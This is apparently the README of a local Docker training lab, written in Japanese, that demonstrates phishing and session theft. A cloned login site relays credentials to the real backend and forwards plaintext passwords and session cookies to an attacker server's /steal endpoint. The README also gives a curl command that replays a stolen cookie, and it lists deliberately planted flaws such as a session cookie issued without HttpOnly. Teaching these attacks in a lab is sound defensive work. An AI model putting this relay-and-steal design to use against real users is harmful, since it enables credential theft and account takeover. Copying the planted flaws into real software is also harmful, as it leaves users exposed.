# フィッシング / XSS デモ環境

ログインフォームを偽装したフィッシングサイトで、被害者の認証情報とセッションCookieを窃取する流れを、ローカルDockerで再現する学習用環境。

---

## 構成

```
ブラウザ
  ├── localhost:80   (本物サイト / Nginx)
  │     ├── /        → frontend (React + Vite)  :5173
  │     └── /api/    → backend  (FastAPI)        :8000
  │
  └── localhost:8080 (フィッシングサイト / Nginx)
        ├── /            → frontend (本物と同じReact)
        ├── /api/login   → phishing-api  :8081  ← ここだけ偽物
        └── /api/...     → backend (本物)

localhost:9000 → attacker (窃取受信サーバー / FastAPI)
```

### コンテナ一覧

| コンテナ | 役割 | 公開ポート |
|---|---|---|
| nginx | 本物サイトのリバースプロキシ | 80 |
| phishing-nginx | フィッシングサイトのリバースプロキシ | 8080 |
| frontend | React フォーム/ダッシュボード | なし(nginx経由) |
| backend | 認証・セッション発行 API | なし(nginx経由) |
| phishing-api | `/api/login` の中間者。本物に中継しつつ窃取 | なし(phishing-nginx経由) |
| attacker | 窃取データ受信・閲覧サーバー | 9000 |

### 意図的に仕込んだ脆弱性

| 箇所 | 脆弱な実装 | 本来の対策 |
|---|---|---|
| `backend/main.py` | `httponly=False` で session Cookie を発行 | `httponly=True` |
| `phishing/main.py` | フィッシングサイトが平文のid/pwを attacker に転送 | (利用者が偽サイトを見抜く / ブラウザのフィッシング警告) |
| `frontend/src/App.tsx` | クライアント側バリデーションのみ | サーバー側でも検証 |

---

## 起動

```bash
docker-compose up --build
```

- 本物サイト: http://localhost
- フィッシングサイト: http://localhost:8080
- 窃取ログ: http://localhost:9000/log

---

## 認証情報

```
ユーザー名: admin
パスワード: password123
```

---

## フィッシング 再現手順

### Step 1: 被害者が偽サイトでログインする

`http://localhost:8080` を開く。見た目は本物 `http://localhost` と完全に同じ React アプリ。被害者が `admin` / `password123` を入力して送信。

### Step 2: phishing-api が中間者として振る舞う

`POST /api/login` だけは `phishing-nginx` 経由で `phishing-api` に届く。phishing-api は次のことを同時に行う:

1. 受け取った id/pw を **本物の backend に転送**してログインを成功させ、`session_id` Cookie を取得
2. 取得した `session_id` と **平文の id/pw を attacker サーバーへ送信** (`/steal?via=phishing&user=...&password=...&c=session_id=...`)
3. 被害者には本物の `session_id` を Cookie としてセットし、レスポンスに `redirect: "http://localhost"` を含めて返す

### Step 3: 被害者は本物サイトにリダイレクトされる

`frontend/src/App.tsx` の `handleSubmit` が `loginData.redirect` を読み、`window.location.href` で `http://localhost` に遷移。被害者は「ログインに成功した」と認識し、異変に気づかない。

### Step 4: 攻撃者は認証情報とセッションを手に入れている

```
http://localhost:9000/log
```

```json
{
  "stolen": [
    {
      "cookie": "session_id=abc123_secret_token",
      "via": "phishing",
      "user": "admin",
      "password": "password123",
      "ip": "..."
    }
  ]
}
```

平文のパスワードまで取れているので、Cookieが切れても再ログイン可能。

### Step 5: 窃取した Cookie でなりすまし

```bash
curl -b "session_id=abc123_secret_token" http://localhost/api/me
```

```json
{"username": "admin", "email": "admin@example.com", "role": "admin"}
```

---

## なぜこの構成で成立するか

- フィッシングサイト側のフロントは**本物と完全に同じ React アプリ**を `proxy_pass` しているため、URL以外に見分ける手段が無い
- `/api/login` だけを phishing-api に向けることで、攻撃者は「ログインAPIの中継点」になる
- backend が `httponly=False` で Cookie を発行しているため、`document.cookie` 経由でも JS から読める(将来的にXSSデモを足す際の前提)

---

## API 一覧

| メソッド | パス | 説明 |
|---|---|---|
| POST | localhost/api/login | 本物の認証API (admin/password123) |
| POST | localhost/api/submit | フォーム送信(Cookie発行) |
| GET  | localhost/api/me | Cookie認証でユーザー情報を返す |
| GET  | localhost/api/health | ヘルスチェック |
| POST | localhost:8080/api/login | フィッシングの偽ログイン(中継+窃取) |
| GET  | localhost:9000/steal | 窃取エンドポイント(`c`, `via`, `user`, `password`) |
| GET  | localhost:9000/log | 窃取済みデータの一覧 |
